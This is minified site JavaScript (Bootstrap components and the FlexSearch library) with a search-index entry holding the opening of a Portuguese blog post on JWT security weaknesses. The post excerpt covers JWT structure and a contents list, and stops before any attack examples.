complete=()=>{if(element.getAttribute("role")!=="tab"){element.classList.remove(CLASS_NAME_SHOW$1);return}element.setAttribute("aria-selected",!1),element.setAttribute("tabindex","-1"),this._toggleDropDown(element,!1),EventHandler.trigger(element,EVENT_HIDDEN$1,{relatedTarget:relatedElem})};this._queueCallback(complete,element,element.classList.contains(CLASS_NAME_FADE$1))}_keydown(event){if(![ARROW_LEFT_KEY,ARROW_RIGHT_KEY,ARROW_UP_KEY,ARROW_DOWN_KEY,HOME_KEY,END_KEY].includes(event.key))return;event.stopPropagation(),event.preventDefault();const children=this._getChildren().filter(element=>!isDisabled(element));let nextActiveElement;if([HOME_KEY,END_KEY].includes(event.key))nextActiveElement=children[event.key===HOME_KEY?0:children.length-1];else{const isNext=[ARROW_RIGHT_KEY,ARROW_DOWN_KEY].includes(event.key);nextActiveElement=getNextActiveElement(children,event.target,isNext,!0)}nextActiveElement&&(nextActiveElement.focus({preventScroll:!0}),Tab.getOrCreateInstance(nextActiveElement).show())}_getChildren(){return SelectorEngine.find(SELECTOR_INNER_ELEM,this._parent)}_getActiveElem(){return this._getChildren().find(child=>this._elemIsActive(child))||null}_setInitialAttributes(parent,children){this._setAttributeIfNotExists(parent,"role","tablist");for(const child of children)this._setInitialAttributesOnChild(child)}_setInitialAttributesOnChild(child){child=this._getInnerElement(child);const isActive=this._elemIsActive(child),outerElem=this._getOuterElement(child);child.setAttribute("aria-selected",isActive),outerElem!==child&&this._setAttributeIfNotExists(outerElem,"role","presentation"),isActive||child.setAttribute("tabindex","-1"),this._setAttributeIfNotExists(child,"role","tab"),this._setInitialAttributesOnTargetPanel(child)}_setInitialAttributesOnTargetPanel(child){const target=SelectorEngine.getElementFromSelector(child);if(!target)return;this._setAttributeIfNotExists(target,"role","tabpanel"),child.id&&this._setAttributeIfNotExists(target,"aria-labelledby",`${child.id}`)}_toggleDropDown(element,open){const outerElem=this._getOuterElement(element);if(!outerElem.classList.contains(CLASS_DROPDOWN))return;const toggle=(selector,className)=>{const element=SelectorEngine.findOne(selector,outerElem);element&&element.classList.toggle(className,open)};toggle(SELECTOR_DROPDOWN_TOGGLE,CLASS_NAME_ACTIVE),toggle(SELECTOR_DROPDOWN_MENU,CLASS_NAME_SHOW$1),outerElem.setAttribute("aria-expanded",open)}_setAttributeIfNotExists(element,attribute,value){element.hasAttribute(attribute)||element.setAttribute(attribute,value)}_elemIsActive(elem){return elem.classList.contains(CLASS_NAME_ACTIVE)}_getInnerElement(elem){return elem.matches(SELECTOR_INNER_ELEM)?elem:SelectorEngine.findOne(SELECTOR_INNER_ELEM,elem)}_getOuterElement(elem){return elem.closest(SELECTOR_OUTER)||elem}static jQueryInterface(config){return this.each(function(){const data=Tab.getOrCreateInstance(this);if(typeof config!="string")return;if(data[config]===void 0||config.startsWith("_")||config==="constructor")throw new TypeError(`No method named "${config}"`);data[config]()})}}EventHandler.on(document,EVENT_CLICK_DATA_API,SELECTOR_DATA_TOGGLE,function(event){if(["A","AREA"].includes(this.tagName)&&event.preventDefault(),isDisabled(this))return;Tab.getOrCreateInstance(this).show()}),EventHandler.on(window,EVENT_LOAD_DATA_API,()=>{for(const element of SelectorEngine.find(SELECTOR_DATA_TOGGLE_ACTIVE))Tab.getOrCreateInstance(element)}),defineJQueryPlugin(Tab);const NAME="toast",DATA_KEY="bs.toast",EVENT_KEY=`.${DATA_KEY}`,EVENT_MOUSEOVER=`mouseover${EVENT_KEY}`,EVENT_MOUSEOUT=`mouseout${EVENT_KEY}`,EVENT_FOCUSIN=`focusin${EVENT_KEY}`,EVENT_FOCUSOUT=`focusout${EVENT_KEY}`,EVENT_HIDE=`hide${EVENT_KEY}`,EVENT_HIDDEN=`hidden${EVENT_KEY}`,EVENT_SHOW=`show${EVENT_KEY}`,EVENT_SHOWN=`shown${EVENT_KEY}`,CLASS_NAME_FADE="fade",CLASS_NAME_HIDE="hide",CLASS_NAME_SHOW="show",CLASS_NAME_SHOWING="showing",DefaultType={animation:"boolean",autohide:"boolean",delay:"number"},Default={animation:!0,autohide:!0,delay:5e3};class Toast extends BaseComponent{constructor(element,config){super(element,config),this._timeout=null,this._hasMouseInteraction=!1,this._hasKeyboardInteraction=!1,this._setListeners()}static get Default(){return Default}static get DefaultType(){return DefaultType}static get NAME(){return NAME}show(){const showEvent=EventHandler.trigger(this._element,EVENT_SHOW);if(showEvent.defaultPrevented)return;this._clearTimeout(),this._config.animation&&this._element.classList.add(CLASS_NAME_FADE);const complete=()=>{this._element.classList.remove(CLASS_NAME_SHOWING),EventHandler.trigger(this._element,EVENT_SHOWN),this._maybeScheduleHide()};this._element.classList.remove(CLASS_NAME_HIDE),reflow(this._element),this._element.classList.add(CLASS_NAME_SHOW,CLASS_NAME_SHOWING),this._queueCallback(complete,this._element,this._config.animation)}hide(){if(!this.isShown())return;const hideEvent=EventHandler.trigger(this._element,EVENT_HIDE);if(hideEvent.defaultPrevented)return;const complete=()=>{this._element.classList.add(CLASS_NAME_HIDE),this._element.classList.remove(CLASS_NAME_SHOWING,CLASS_NAME_SHOW),EventHandler.trigger(this._element,EVENT_HIDDEN)};this._element.classList.add(CLASS_NAME_SHOWING),this._queueCallback(complete,this._element,this._config.animation)}dispose(){this._clearTimeout(),this.isShown()&&this._element.classList.remove(CLASS_NAME_SHOW),super.dispose()}isShown(){return this._element.classList.contains(CLASS_NAME_SHOW)}_maybeScheduleHide(){if(!this._config.autohide)return;if(this._hasMouseInteraction||this._hasKeyboardInteraction)return;this._timeout=setTimeout(()=>{this.hide()},this._config.delay)}_onInteraction(event,isInteracting){switch(event.type){case"mouseover":case"mouseout":{this._hasMouseInteraction=isInteracting;break}case"focusin":case"focusout":{this._hasKeyboardInteraction=isInteracting;break}}if(isInteracting){this._clearTimeout();return}const nextElement=event.relatedTarget;if(this._element===nextElement||this._element.contains(nextElement))return;this._maybeScheduleHide()}_setListeners(){EventHandler.on(this._element,EVENT_MOUSEOVER,event=>this._onInteraction(event,!0)),EventHandler.on(this._element,EVENT_MOUSEOUT,event=>this._onInteraction(event,!1)),EventHandler.on(this._element,EVENT_FOCUSIN,event=>this._onInteraction(event,!0)),EventHandler.on(this._element,EVENT_FOCUSOUT,event=>this._onInteraction(event,!1))}_clearTimeout(){clearTimeout(this._timeout),this._timeout=null}static jQueryInterface(config){return this.each(function(){const data=Toast.getOrCreateInstance(this,config);if(typeof config=="string"){if(typeof data[config]=="undefined")throw new TypeError(`No method named "${config}"`);data[config](this)}})}}enableDismissTrigger(Toast),defineJQueryPlugin(Toast);const index_umd={Alert,Button,Carousel,Collapse,Dropdown,Modal,Offcanvas,Popover,ScrollSpy,Tab,Toast,Tooltip};return index_umd}),function _f(self){"use strict";try{module&&(self=module)}catch{}self._factory=_f;function u(a){return"undefined"==typeof a||a}function v(a){const b=Array(a);for(let c=0;c<a;c++)b[c]=x();return b}function x(){return Object.create(null)}function aa(a,b){return b.length-a.length}function C(a){return"string"==typeof a}function D(a){return"object"==typeof a}function E(a){return"function"==typeof a}function ba(a,b){var c=ca;if(a&&(b&&(a=F(a,b)),this.H&&(a=F(a,this.H)),this.J&&1<a.length&&(a=F(a,this.J)),c||""===c)){if(b=a.split(c),this.filter){a=this.filter,c=b.length;const d=[];for(let e=0,f=0;e<c;e++){const h=b[e];h&&!a[h]&&(d[f++]=h)}a=d}else a=b;return a}return a}const ca=/[\p{Z}\p{S}\p{P}\p{C}]+/u,da=/[\u0300-\u036f]/g;function ea(a,b){const c=Object.keys(a),d=c.length,e=[];let f="",h=0;for(let g=0,k,m;g<d;g++)k=c[g],(m=a[k])?(e[h++]=G(b?"(?!\\b)"+k+"(\\b|_)":k),e[h++]=m):f+=(f?"|":"")+k;return f&&(e[h++]=G(b?"(?!\\b)("+f+")(\\b|_)":"("+f+")"),e[h]=""),e}function F(a,b){for(let c=0,d=b.length;c<d&&(a=a.replace(b[c],b[c+1]),a);c+=2);return a}function G(a){return new RegExp(a,"g")}function fa(a){let b="",c="";for(let d=0,e=a.length,f;d<e;d++)(f=a[d])!==c&&(b+=c=f);return b}var t,Aa,Da,Ha,Ka,ia={encode:ha,F:!1,G:""};function ha(a){return ba.call(this,(""+a).toLowerCase(),!1)}const ja={},I={};function ka(a){J(a,"add"),J(a,"append"),J(a,"search"),J(a,"update"),J(a,"remove")}function J(a,b){a[b+"Async"]=function(){const c=this,d=arguments;var e=d[d.length-1];let f;return E(e)&&(f=e,delete d[d.length-1]),e=new Promise(function(h){setTimeout(function(){c.async=!0;const g=c[b].apply(c,d);c.async=!1,h(g)})}),f?(e.then(f),this):e}}function la(a,b,c,d){const e=a.length;let f=[],h,g,k=0;d&&(d=[]);for(let m=e-1;0<=m;m--){const n=a[m],w=n.length,q=x();let r=!h;for(let l=0;l<w;l++){const p=n[l],A=p.length;if(A)for(let B=0,z,y;B<A;B++)if(y=p[B],h){{if(h[y]){if(!m)if(c)c--;else if(f[k++]=y,k===b)return f;(m||d)&&(q[y]=1),r=!0}if(d&&(z=(g[y]||0)+1,g[y]=z,z<e)){const H=d[z-2]||(d[z-2]=[]);H[H.length]=y}}}else q[y]=1}if(d)h||(g=q);else if(!r)return[];h=q}if(d)for(let m=d.length-1,n,w;0<=m;m--){n=d[m],w=n.length;for(let q=0,r;q<w;q++)if(r=n[q],!h[r]){if(c)c--;else if(f[k++]=r,k===b)return f;h[r]=1}}return f}function ma(a,b){const c=x(),d=x(),e=[];for(let f=0;f<a.length;f++)c[a[f]]=1;for(let f=0,h;f<b.length;f++){h=b[f];for(let g=0,k;g<h.length;g++)k=h[g],c[k]&&!d[k]&&(d[k]=1,e[e.length]=k)}return e}function K(a){this.l=!0!==a&&a,this.cache=x(),this.h=[]}function na(a,b,c){D(a)&&(a=a.query);let d=this.cache.get(a);return d||(d=this.search(a,b,c),this.cache.set(a,d)),d}K.prototype.set=function(a,b){if(!this.cache[a]){var c=this.h.length;c===this.l?delete this.cache[this.h[c-1]]:c++;for(--c;0<c;c--)this.h[c]=this.h[c-1];this.h[0]=a}this.cache[a]=b},K.prototype.get=function(a){const b=this.cache[a];if(this.l&&b&&(a=this.h.indexOf(a))){const c=this.h[a-1];this.h[a-1]=this.h[a],this.h[a]=c}return b};const pa={memory:{charset:"latin:extra",D:3,B:4,m:!1},performance:{D:3,B:3,s:!1,context:{depth:2,D:1}},match:{charset:"latin:extra",G:"reverse"},score:{charset:"latin:advanced",D:20,B:3,context:{depth:3,D:9}},default:{}};function qa(a,b,c,d,e,f,h,g){setTimeout(function(){const k=a(c?c+"."+d:d,JSON.stringify(h));k&&k.then?k.then(function(){b.export(a,b,c,e,f+1,g)}):b.export(a,b,c,e,f+1,g)})}function L(a,b){if(!(this instanceof L))return new L(a);if(a){C(a)?a=pa[a]:(c=a.preset)&&(a=Object.assign({},c[c],a)),c=a.charset;var c,d=a.lang;C(c)&&(-1===c.indexOf(":")&&(c+=":default"),c=I[c]),C(d)&&(d=ja[d])}else a={};let e,f,h=a.context||{};if(this.encode=a.encode||c&&c.encode||ha,this.register=b||x(),this.D=e=a.resolution||9,this.G=b=c&&c.G||a.tokenize||"strict",this.depth="strict"===b&&h.depth,this.l=u(h.bidirectional),this.s=f=u(a.optimize),this.m=u(a.fastupdate),this.B=a.minlength||1,this.C=a.boost,this.map=f?v(e):x(),this.A=e=h.resolution||1,this.h=f?v(e):x(),this.F=c&&c.F||a.rtl,this.H=(b=a.matcher||d&&d.H)&&ea(b,!1),this.J=(b=a.stemmer||d&&d.J)&&ea(b,!0),c=b=a.filter||d&&d.filter){c=b,d=x();for(let g=0,k=c.length;g<k;g++)d[c[g]]=1;c=d}this.filter=c,this.cache=(b=a.cache)&&new K(b)}t=L.prototype,t.append=function(a,b){return this.add(a,b,!0)},t.add=function(a,b,c,d){if(b&&(a||0===a)){if(!d&&!c&&this.register[a])return this.update(a,b);if(b=this.encode(b),d=b.length){const m=x(),n=x(),w=this.depth,q=this.D;for(let r=0;r<d;r++){let l=b[this.F?d-1-r:r];if(e=l.length,l&&e>=this.B&&(w||!n[l])){var e,g,k,f=M(q,d,r),h="";switch(this.G){case"full":if(2<e){for(f=0;f<e;f++)for(g=e;g>f;g--)g-f>=this.B&&(k=M(q,d,r,e,f),h=l.substring(f,g),N(this,n,h,k,a,c));break}case"reverse":if(1<e){for(g=e-1;0<g;g--)h=l[g]+h,h.length>=this.B&&N(this,n,h,M(q,d,r,e,g),a,c);h=""}case"forward":if(1<e){for(g=0;g<e;g++)h+=l[g],h.length>=this.B&&N(this,n,h,f,a,c);break}default:if(this.C&&(f=Math.min(f/this.C(b,l,r)|0,q-1)),N(this,n,l,f,a,c),w&&1<d&&r<d-1)for(e=x(),h=this.A,f=l,g=Math.min(w+1,d-r),e[f]=1,k=1;k<g;k++)if((l=b[this.F?d-1-r-k:r+k])&&l.length>=this.B&&!e[l]){e[l]=1;const p=this.l&&l>f;N(this,m,p?f:l,M(h+(d/2>h?0:1),d,r,g-1,k-1),a,c,p?l:f)}}}}this.m||(this.register[a]=1)}}return this};function M(a,b,c,d,e){return c&&1<a?b+(d||0)<=a?c+(e||0):(a-1)/(b+(d||0))*(c+(e||0))+1|0:0}function N(a,b,c,d,e,f,h){let g=h?a.h:a.map;(!b[c]||h&&!b[c][h])&&(a.s&&(g=g[d]),h?(b=b[c]||(b[c]=x()),b[h]=1,g=g[h]||(g[h]=x())):b[c]=1,g=g[c]||(g[c]=[]),a.s||(g=g[d]||(g[d]=[])),f&&g.includes(e)||(g[g.length]=e,a.m&&(a=a.register[e]||(a.register[e]=[]),a[a.length]=g)))}t.search=function(a,b,c){c||(!b&&D(a)?(c=a,a=c.query):D(b)&&(c=b));let d=[],e,f,h=0;if(c){a=c.query||a,b=c.limit,h=c.offset||0;var k,g=c.context;f=c.suggest}if(a&&(a=this.encode(""+a),e=a.length,1<e)){c=x(),k=[];for(let n=0,w=0,q;n<e;n++)if((q=a[n])&&q.length>=this.B&&!c[q])if(this.s||f||this.map[q])k[w++]=q,c[q]=1;else return d;a=k,e=a.length}if(!e)return d;b||(b=100),g=this.depth&&1<e&&!1!==g,c=0;let m;g?(m=a[0],c=1):1<e&&a.sort(aa);for(let n,w;c<e;c++){if(w=a[c],g?(n=ra(this,d,f,b,h,2===e,w,m),f&&!1===n&&d.length||(m=w)):n=ra(this,d,f,b,h,1===e,w),n)return n;if(f&&c===e-1){if(k=d.length,!k){if(g){g=0,c=-1;continue}return d}if(1===k)return sa(d[0],b,h)}}return la(d,b,h,f)};function ra(a,b,c,d,e,f,h,g){let k=[],m=g?a.h:a.map;if(a.s||(m=ta(m,h,g,a.l)),m){let n=0;const w=Math.min(m.length,g?a.A:a.D);for(let q=0,r=0,l,p;q<w;q++)if((l=m[q])&&(a.s&&(l=ta(l,h,g,a.l)),e&&l&&f&&(p=l.length,p<=e?(e-=p,l=null):(l=l.slice(e),e=0)),l&&(k[n++]=l,f&&(r+=l.length,r>=d))))break;if(n){if(f)return sa(k,d,0);b[b.length]=k;return}}return!c&&k}function sa(a,b,c){return a=1===a.length?a[0]:[].concat.apply([],a),c||a.length>b?a.slice(c,c+b):a}function ta(a,b,c,d){return c?(d=d&&b>c,a=(a=a[d?b:c])&&a[d?c:b]):a=a[b],a}t.contain=function(a){return!!this.register[a]},t.update=function(a,b){return this.remove(a).add(a,b)},t.remove=function(a,b){const c=this.register[a];if(c){if(this.m)for(let d=0,e;d<c.length;d++)e=c[d],e.splice(e.indexOf(a),1);else O(this.map,a,this.D,this.s),this.depth&&O(this.h,a,this.A,this.s);if(b||delete this.register[a],this.cache){b=this.cache;for(let d=0,e,f;d<b.h.length;d++)f=b.h[d],e=b.cache[f],e.includes(a)&&(b.h.splice(d--,1),delete b.cache[f])}}return this};function O(a,b,c,d,e){let f=0;if(a.constructor===Array)if(e)b=a.indexOf(b),-1!==b?1<a.length&&(a.splice(b,1),f++):f++;else{e=Math.min(a.length,c);for(let h=0,g;h<e;h++)(g=a[h])&&(f=O(g,b,c,d,e),d||f||delete a[h])}else for(let h in a)(f=O(a[h],b,c,d,e))||delete a[h];return f}t.searchCache=na,t.export=function(a,b,c,d,e,f){let h=!0;"undefined"==typeof f&&(h=new Promise(m=>{f=m}));let g,k;switch(e||(e=0)){case 0:if(g="reg",this.m){k=x();for(let m in this.register)k[m]=1}else k=this.register;break;case 1:g="cfg",k={doc:0,opt:this.s?1:0};break;case 2:g="map",k=this.map;break;case 3:g="ctx",k=this.h;break;default:"undefined"==typeof c&&f&&f();return}return qa(a,b||this,c,g,d,e,k,f),h},t.import=function(a,b){if(b)switch(C(b)&&(b=JSON.parse(b)),a){case"cfg":this.s=!!b.opt;break;case"reg":this.m=!1,this.register=b;break;case"map":this.map=b;break;case"ctx":this.h=b}},ka(L.prototype);function ua(a){a=a.data;var d,b=self._index;const c=a.args;switch(d=a.task,d){case"init":d=a.options||{},a=a.factory,b=d.encode,d.cache=!1,b&&0===b.indexOf("function")&&(d.encode=Function("return "+b)()),a?(Function("return "+a)()(self),self._index=new self.FlexSearch.Index(d),delete self.FlexSearch):self._index=new L(d);break;default:a=a.id,b=b[d].apply(b,c),postMessage("search"===d?{id:a,msg:b}:{id:a})}}let va=0;function P(a){if(!(this instanceof P))return new P(a);var b;a?E(b=a.encode)&&(a.encode=b.toString()):a={},(b=(self||window)._factory)&&(b=b.toString());const c="undefined"==typeof window&&self.exports,d=this;this.o=wa(b,c,a.worker),this.h=x(),this.o&&(c?this.o.on("message",function(e){d.h[e.id](e.msg),delete d.h[e.id]}):this.o.onmessage=function(e){e=e.data,d.h[e.id](e.msg),delete d.h[e.id]},this.o.postMessage({task:"init",factory:b,options:a}))}Q("add"),Q("append"),Q("search"),Q("update"),Q("remove");function Q(a){P.prototype[a]=P.prototype[a+"Async"]=function(){const b=this,c=[].slice.call(arguments);var d=c[c.length-1];let e;return E(d)&&(e=d,c.splice(c.length-1,1)),d=new Promise(function(f){setTimeout(function(){b.h[++va]=f,b.o.postMessage({task:a,id:va,args:c})})}),e?(d.then(e),this):d}}function wa(a,b,c){let d;try{d=b?new(require("worker_threads").Worker)(__dirname+"/node/node.js"):a?new Worker(URL.createObjectURL(new Blob(["onmessage="+ua.toString()],{type:"text/javascript"}))):new Worker(C(c)?c:"worker/worker.js",{type:"module"})}catch{}return d}function S(a){if(!(this instanceof S))return new S(a);var c,b=a.document||a.doc||a;this.K=[],this.h=[],this.A=[],this.register=x(),this.key=(c=b.key||b.id)&&T(c,this.A)||"id",this.m=u(a.fastupdate),this.C=(c=b.store)&&!0!==c&&[],this.store=c&&x(),this.I=(c=b.tag)&&T(c,this.A),this.l=c&&x(),this.cache=(c=a.cache)&&new K(c),a.cache=!1,this.o=a.worker,this.async=!1,c=x();let d=b.index||b.field||b;C(d)&&(d=[d]);for(let e=0,f,h;e<d.length;e++)f=d[e],C(f)||(h=f,f=f.field),h=D(h)?Object.assign({},a,h):a,this.o&&(c[f]=new P(h),c[f].o||(this.o=!1)),this.o||(c[f]=new L(h,this.register)),this.K[e]=T(f,this.A),this.h[e]=f;if(this.C)for(a=b.store,C(a)&&(a=[a]),b=0;b<a.length;b++)this.C[b]=T(a[b],this.A);this.index=c}function T(a,b){const c=a.split(":");let d=0;for(let e=0;e<c.length;e++)a=c[e],0<=a.indexOf("[]")&&(a=a.substring(0,a.length-2))&&(b[d]=!0),a&&(c[d++]=a);return d<c.length&&(c.length=d),1<d?c:c[0]}function U(a,b){if(C(b))a=a[b];else for(let c=0;a&&c<b.length;c++)a=a[b[c]];return a}function V(a,b,c,d,e){if(a=a[e],d===c.length-1)b[e]=a;else if(a)if(a.constructor===Array)for(b=b[e]=Array(a.length),e=0;e<a.length;e++)V(a,b,c,d,e);else b=b[e]||(b[e]=x()),e=c[++d],V(a,b,c,d,e)}function X(a,b,c,d,e,f,h,g){if(a=a[h])if(d===b.length-1){if(a.constructor===Array){if(c[d]){for(b=0;b<a.length;b++)e.add(f,a[b],!0,!0);return}a=a.join(" ")}e.add(f,a,g,!0)}else if(a.constructor===Array)for(h=0;h<a.length;h++)X(a,b,c,d,e,f,h,g);else h=b[++d],X(a,b,c,d,e,f,h,g)}t=S.prototype,t.add=function(a,b,c){if(D(a)&&(b=a,a=U(b,this.key)),b&&(a||0===a)){if(!c&&this.register[a])return this.update(a,b);for(let d=0,e,f;d<this.h.length;d++)f=this.h[d],e=this.K[d],C(e)&&(e=[e]),X(b,e,this.A,0,this.index[f],a,e[0],c);if(this.I){let d=U(b,this.I),e=x();C(d)&&(d=[d]);for(let f=0,h,g;f<d.length;f++)if(h=d[f],!e[h]&&(e[h]=1,g=this.l[h]||(this.l[h]=[]),!c||!g.includes(a))&&(g[g.length]=a,this.m)){const k=this.register[a]||(this.register[a]=[]);k[k.length]=g}}if(this.store&&(!c||!this.store[a])){let d;if(this.C){d=x();for(let e=0,f;e<this.C.length;e++)f=this.C[e],C(f)?d[f]=b[f]:V(b,d,f,0,f[0])}this.store[a]=d||b}}return this},t.append=function(a,b){return this.add(a,b,!0)},t.update=function(a,b){return this.remove(a).add(a,b)},t.remove=function(a){if(D(a)&&(a=U(a,this.key)),this.register[a]){for(var b=0;b<this.h.length&&(this.index[this.h[b]].remove(a,!this.o),!this.m);b++);if(this.I&&!this.m)for(let c in this.l){b=this.l[c];const d=b.indexOf(a);-1!==d&&(1<b.length?b.splice(d,1):delete this.l[c])}this.store&&delete this.store[a],delete this.register[a]}return this},t.search=function(a,b,c,d){c||(!b&&D(a)?(c=a,a=""):D(b)&&(c=b,b=0));let e=[],f=[],h,g,k,m,n,w,q=0;if(c)if(c.constructor===Array)k=c,c=null;else{if(a=c.query||a,k=(h=c.pluck)||c.index||c.field,m=c.tag,g=this.store&&c.enrich,n="and"===c.bool,b=c.limit||b||100,w=c.offset||0,m&&(C(m)&&(m=[m]),!a)){for(let l=0,p;l<m.length;l++)(p=xa.call(this,m[l],b,w,g))&&(e[e.length]=p,q++);return q?e:[]}C(k)&&(k=[k])}k||(k=this.h),n=n&&(1<k.length||m&&1<m.length);const r=!d&&(this.o||this.async)&&[];for(let l=0,p,A,B;l<k.length;l++){let z;if(A=k[l],C(A)||(z=A,A=z.field,a=z.query||a,b=z.limit||b,g=z.enrich||g),r)r[l]=this.index[A].searchAsync(a,b,z||c);else{if(d?p=d[l]:p=this.index[A].search(a,b,z||c),B=p&&p.length,m&&B){const y=[];let H=0;n&&(y[0]=[p]);for(let W=0,oa,R;W<m.length;W++)(oa=m[W],B=(R=this.l[oa])&&R.length)&&(H++,y[y.length]=n?[R]:R);H&&(p=n?la(y,b||100,w||0):ma(p,y),B=p.length)}if(B)f[q]=A,e[q++]=p;else if(n)return[]}}if(r){const l=this;return new Promise(function(p){Promise.all(r).then(function(A){p(l.search(a,b,c,A))})})}if(!q)return[];if(h&&(!g||!this.store))return e[0];for(let l=0,p;l<f.length;l++){if(p=e[l],p.length&&g&&(p=ya.call(this,p)),h)return p;e[l]={field:f[l],result:p}}return e};function xa(a,b,c,d){let e=this.l[a],f=e&&e.length-c;if(f&&0<f)return(f>b||c)&&(e=e.slice(c,c+b)),d&&(e=ya.call(this,e)),{tag:a,result:e}}function ya(a){const b=Array(a.length);for(let c=0,d;c<a.length;c++)d=a[c],b[c]={id:d,doc:this.store[d]};return b}t.contain=function(a){return!!this.register[a]},t.get=function(a){return this.store[a]},t.set=function(a,b){return this.store[a]=b,this},t.searchCache=na,t.export=function(a,b,c,d,e,f){let h;if("undefined"==typeof f&&(h=new Promise(g=>{f=g})),e||(e=0),d||(d=0),d<this.h.length){const g=this.h[d],k=this.index[g];b=this,setTimeout(function(){k.export(a,b,e?g:"",d,e++,f)||(d++,e=1,b.export(a,b,g,d,e,f))})}else{let g,k;switch(e){case 1:g="tag",k=this.l,c=null;break;case 2:g="store",k=this.store,c=null;break;default:f();return}qa(a,this,c,g,d,e,k,f)}return h},t.import=function(a,b){if(b)switch(C(b)&&(b=JSON.parse(b)),a){case"tag":this.l=b;break;case"reg":this.m=!1,this.register=b;for(let d=0,e;d<this.h.length;d++)e=this.index[this.h[d]],e.register=b,e.m=!1;break;case"store":this.store=b;break;default:a=a.split(".");const c=a[0];a=a[1],c&&a&&this.index[c].import(a,b)}},ka(S.prototype),Aa={encode:za,F:!1,G:""};const Ba=[G("[àáâãäå]"),"a",G("[èéêë]"),"e",G("[ìíîï]"),"i",G("[òóôõöő]"),"o",G("[ùúûüű]"),"u",G("[ýŷÿ]"),"y",G("ñ"),"n",G("[çc]"),"k",G("ß"),"s",G(" & ")," and "];function za(a){var b=a=""+a;return b.normalize&&(b=b.normalize("NFD").replace(da,"")),ba.call(this,b.toLowerCase(),!a.normalize&&Ba)}Da={encode:Ca,F:!1,G:"strict"};const Ea=/[^a-z0-9]+/,Fa={b:"p",v:"f",w:"f",z:"s",x:"s","ß":"s",d:"t",n:"m",c:"k",g:"k",j:"k",q:"k",i:"e",y:"e",u:"o"};function Ca(a){a=za.call(this,a).join(" ");const b=[];if(a){const c=a.split(Ea),d=c.length;for(let e=0,f,h=0;e<d;e++)if((a=c[e])&&(!this.filter||!this.filter[a])){f=a[0];let g=Fa[f]||f,k=g;for(let m=1;m<a.length;m++){f=a[m];const n=Fa[f]||f;n&&n!==k&&(g+=n,k=n)}b[h++]=g}}return b}Ha={encode:Ga,F:!1,G:""};const Ia=[G("ae"),"a",G("oe"),"o",G("sh"),"s",G("th"),"t",G("ph"),"f",G("pf"),"f",G("(?![aeo])h(?![aeo])"),"",G("(?!^[aeo])h(?!^[aeo])"),""];function Ga(a,b){return a&&(a=Ca.call(this,a).join(" "),2<a.length&&(a=F(a,Ia)),b||(1<a.length&&(a=fa(a)),a&&(a=a.split(" ")))),a||[]}Ka={encode:Ja,F:!1,G:""};const La=G("(?!\\b)[aeo]");function Ja(a){return a&&(a=Ga.call(this,a,!0),1<a.length&&(a=a.replace(La,"")),1<a.length&&(a=fa(a)),a&&(a=a.split(" "))),a||[]}I["latin:default"]=ia,I["latin:simple"]=Aa,I["latin:balance"]=Da,I["latin:advanced"]=Ha,I["latin:extra"]=Ka;const Y={Index:L,Document:S,Worker:P,registerCharset:function(a,b){I[a]=b},registerLanguage:function(a,b){ja[a]=b}};let Z;(Z=self.define)&&Z.amd?Z([],function(){return Y}):self.exports?self.exports=Y:self.FlexSearch=Y}(this);const search=document.querySelector(".search-input"),suggestions=document.querySelector(".search-suggestions"),background=document.querySelector(".search-background");var index=new FlexSearch.Document({tokenize:"forward",cache:100,document:{id:"id",tag:"tag",store:["href","title","description"],index:["title","description","content"]}});function initIndex(){index.add({id:0,tag:"en",href:"/blog/jwt_insecurity/",title:"(In)segurança em tokens JWT",description:"Existem muitas bibliotecas disponíveis que suportam JWT, e o próprio padrão possui 'rico suporte para mecanismos criptográficos'. Tudo isso significa que o JWT é realmente seguro? Vamos ver.",content:`Texto de pesquisa traduzido do original por MICHAŁ SAJDAK.
O JWT (JSON Web Token) é um mecanismo usado com frequência nas APIs REST e pode ser encontrado em padrões populares, como o OpenID Connect, mas também o encontramos algumas vezes usando o OAuth2. É usado tanto em grandes empresas quanto em organizações menores.
Sumário &nbsp; Sumário Introdução ao JWT Outros examples de JWT e seus primeiros problemas de segurança Espinhos do JWT 🌹 Primeiro espinho: é complexo! Segundo espinho: none! Terceiro espinho: quebrando a chave HMAC Quarto espinho: muitos cozinheiros estragam o caldo do JWT Quinto espinho: fornecendo sua própria chave Sexto espinho: a criptografia JWT funciona mesmo? Sétimo espinho: decodificação / verificação - isso importa? 😉 Oitavo espinho: capturar qualquer token = assumir o acesso à API? Nono espinho: replay JWT Décimo espinho: timing attacks na assinatura Décimo-primeiro espinho: grande quantidade de bibliotecas disponíveis Alternativa ao JWT? O JWT pode ser seguro? O que devo fazer? Pra começar Chaves Assinatura Regras gerais Payload Bibliotecas Referências Introdução ao JWT &nbsp; A RFC 7519 diz:
O JSON Web Token (JWT) é um meio compacto e seguro de URL de representar claims a serem transferidas entre duas partes. As claims em um JWT são codificadas como um objeto JSON usado como payload de uma estrutura JSON Web Signature (JWS) ou como texto sem formatação de uma estrutura JSON Web Encryption (JWE) (…)
Simplificando, o JWT é uma sequência de caracteres no formato JSON (https://www.json.org/) codificado na estrutura JWS (JSON Web Signature) ou JWE (JSON Web Encryption). Além disso, cada uma dessas opções deve ser serializada de maneira compacta (uma das duas serializações no JWS e JWE). Na maioria das vezes você pode ver o JWS, e é essa estrutura que é popularmente chamada JWT. Por sua vez, &ldquo;claim&rdquo; é geralmente um simples par de &ldquo;chave&rdquo;: &ldquo;valor&rdquo;
Um exemplo de um JWT é mostrado abaixo:
Você pode ver que temos aqui três longas sequências de caracteres separadas por um ponto. A estrutura do todo é a seguinte:
cabeçalho . payload . assinatura
Os três elementos acima são codificados com o algoritmo BASE64URL (que se parece muito com o BASE64, onde o sinal de mais (+) na saída é substituído por hífen (-), a barra (/) é substituída pelo undescore (_) e existe nenhum preenchimento BASE64 padrão, que geralmente consiste em sinais de igual (=)).
Após decodificar a sequência acima (que pode ser feita, por exemplo, por https://jwt.io/), podemos ver um cabeçalho e payload totalmente legíveis.
Se você quiser saber mais sobre o JWT, os seguintes recursos podem ser úteis:
Introdução. Mais detalhes técnicos. JOSE Project (Javascript Object Signing and Encryption) – exceto para JWT / JWT, você pode ler mais sobre JWK (JSON Web Key), JWA (JSON Web Algorithms), uso diferente dos mecanismos no OAuth2 / OpenID Connect; acontece que o JWS pode ter mais de uma assinatura, os JWTs podem ser aninhados… Um bom resumo disponível aqui. Outros examples de JWT e seus primeiros problemas de segurança &nbsp; Vamos para o tópico principal - segurança JWT. Às vezes, os JWTs podem ser usados ​​como &ldquo;chaves de API&rdquo;. No exemplo de uma chave desse tipo, pode ser assim:
